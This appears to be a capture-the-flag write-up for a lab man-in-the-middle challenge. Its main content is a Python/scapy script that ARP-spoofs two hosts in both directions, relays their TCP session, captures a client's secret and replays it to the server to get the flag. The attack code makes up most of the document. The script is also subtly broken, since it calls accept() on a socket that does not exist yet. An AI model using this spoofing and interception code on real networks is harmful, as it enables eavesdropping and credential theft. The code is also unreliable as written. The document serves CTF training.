# Problem Statement
Man-in-the-middle traffic from a remote host. The remote host at 10.0.0.2 is communicating with the remote host at 10.0.0.3 on port 31337.

## Observations
  - In this case, using scapy to intercept traffic that isn't addressed to us and respond using raw sockets is a bit of a PITA. We already worked on that in the previous challenge
  - To handle the connections themselves a bit easier, I added PREROUTING rules to the DNAT table so that packets with a dst IP field of 10.0.0.{2,3} are rerouted to 10.0.0.1 instead of dropped.
    - Now we can use regular sockets and focus on the MITM logic.
  - Note that in the code below, when I define server_socket it means that socket *acts* as the server. If I want to send data to the client, then I do `server_socket.sendall(bytes)`, although it sounds a bit weird if you think about it for too long. The same with the client_socket, but viceversa.
## Solution
```
from scapy.all import *

def arp_spoof(victim_ip, impersonated_ip):
    hwsrc = get_if_hwaddr("eth0")
    hwdst = getmacbyip(victim_ip)
    send(ARP(op=2, hwsrc=hwsrc, hwdst=hwdst, psrc=impersonated_ip, pdst=victim_ip))

########################################
############ Legit Flow ################
########################################
# Server listens on on port 31337
# Client connects to 10.0.0.3:31337
# Server sends b"secret: "
# Client reads secret out-of-band
# Client sends bytes(hex(secret))
# Server compares secrets
# Server sends b"command: " and waits for "echo" or "flag" (server decodes)
# Client sends b"echo"
# Both send b"Hello, World!"

########################################
############# MITM Flow ################
########################################
# We listen on on port 31337 and arp spoof client(10.0.0.2)'s cache for 10.0.0.3
# Client connects to us at "10.0.0.3":31337
# We connect to Server at 10.0.0.3:31337
# We read b"secret: " and forward to Client
# Client sends bytes(hex(secret)) to us, we intercept and send to Server
# Server compares secrets
# Server sends b"command: " and waits for "echo" or "flag" (server decodes)
# We send b"flag"
# Both send b"Hello, World!"
########################################

import socket

# ARP Spoof both ways
print("Spoofing 10.0.0.2's cache to impersonate 10.0.0.3")
arp_spoof("10.0.0.2", "10.0.0.3")
print("Spoofing 10.0.0.3's cache to impersonate 10.0.0.2")
arp_spoof("10.0.0.3", "10.0.0.2")

print("Listening for incoming connections")
server_listener = socket.socket()
server_listener.bind(("0.0.0.0", 31337))
server_listener.listen()
server_socket, client_addr = server_socket.accept()
print(f"\tConnection accepted from {client_addr}")

print("Connecting to 10.0.0.3")
client_socket = socket.socket()
client_socket.connect(("10.0.0.3", 31337))
print("\t Connected (probably, if no timeout or other exception was thrown)")

print("\n * MITM is set up *\n\n Waiting for data from Server . . .")
rcv = client_socket.recv(1024)
print(f"Data from server: {rcv.decode()}")
if rcv == b"secret: ":
    print("Server challenge received, forwarding to client")
    server_socket.sendall(b"secret: ")
else:
    print("No challenge received. Aborting")
    exit() 

print("Intercepting secret from client:")
try:
    secret = server_socket.recv(1024)
    print(f"\t Secret intercepted: {secret.decode()}")
except Exception as e:
    print(f"Exception {e} occurred while decoding secret")

client_socket.sendall(secret)
rcv = client_socket.recv(1024)
if rcv == b"command: ":
    print("Server request for command received, asking for flag")
    client_socket.sendall(b"flag")
else:
    print("No command request received. Aborting")
    exit() 
flag = client_socket.recv(1024).decode()
print(f"Flag: {flag}")
```
